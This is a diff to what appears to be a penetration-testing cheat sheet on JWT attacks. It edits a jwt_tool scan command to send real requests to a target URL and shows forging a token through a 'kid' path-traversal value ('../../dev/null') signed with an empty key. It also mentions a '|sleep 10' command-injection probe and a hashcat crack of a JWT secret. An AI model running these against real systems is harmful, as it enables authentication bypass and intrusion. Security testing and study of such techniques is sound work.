@@ -27,7 +27,7 @@ hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
 ### `kid` header injection
 If `kid` names a file path the server reads as the verification key, point it at something with known (or empty) content and sign to match:
 ```bash
-jwt_tool.py <JWT> -M pb
+jwt_tool.py -t 'http://<IP>/<PATH>' -rc '<NAME>=<JWT>' -M pb
 jwt_tool.py <JWT> -I -hc kid -hv '../../../../../../../dev/null' -S hs256 -p ''
 ```
-- `-M pb` (playbook) runs this automatically — null-signed `kid=/dev/null` and path-traversal variants, plus a `kid` command-injection probe (`|sleep 10`) — alongside every other built-in check. The `-I`/`-hc`/`-hv` form targets just this one.
+- `-M pb` (playbook) runs this automatically — null-signed `kid=/dev/null` and path-traversal variants, plus a `kid` command-injection probe (`|sleep 10`) — alongside every other built-in check. Scan modes send real requests: `-t` = a page that checks the token, `-rc` = cookie carrying it (header token: `-rh 'Authorization: Bearer <JWT>'`). The `-I`/`-hc`/`-hv` form targets just this one.
